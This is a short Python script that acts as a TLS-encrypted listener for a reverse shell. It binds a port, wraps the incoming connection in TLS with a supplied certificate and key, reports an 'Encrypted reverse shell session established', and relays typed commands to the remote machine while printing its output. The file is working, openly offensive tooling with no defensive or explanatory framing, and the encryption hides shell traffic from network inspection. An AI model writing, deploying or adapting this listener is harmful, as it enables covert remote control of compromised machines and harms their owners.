#!/usr/bin/env python3

import socket
import sys
import threading
import ssl

if len(sys.argv) <= 4:
    print(f"Usage: {sys.argv[0]} <port> <cert> <key> <encode>")
    print(f"Example: python listener.py 6666 server.crt server.key utf-8")
    exit(1)
context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certfile=sys.argv[2], keyfile=sys.argv[3])

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(("0.0.0.0", int(sys.argv[1])))
sock.listen()

print(f"[+] TLS Listener started on port {sys.argv[1]}")
print("[+] Waiting for connection...")

conn, addr = sock.accept()

try:
    conn = context.wrap_socket(conn, server_side=True)
    print("[+] TLS handshake completed successfully")
    print("[+] Encrypted reverse shell session established")
    print("=" * 50)
except Exception as e:
    print(f"[-] TLS handshake failed: {e}")
    conn.close()
    exit(1)
def recv():
    while True:
        data = conn.recv(65535)
        sys.stdout.buffer.write(data.decode(sys.argv[4]).encode())
        #sys.stdout.buffer.write(data)
        sys.stdout.buffer.flush()

recvthread = threading.Thread(target=recv)
recvthread.start()

while True:
    data = sys.stdin.buffer.readline()
    conn.send(data.decode().encode(sys.argv[4]))
    sys.stdin.buffer.flush()
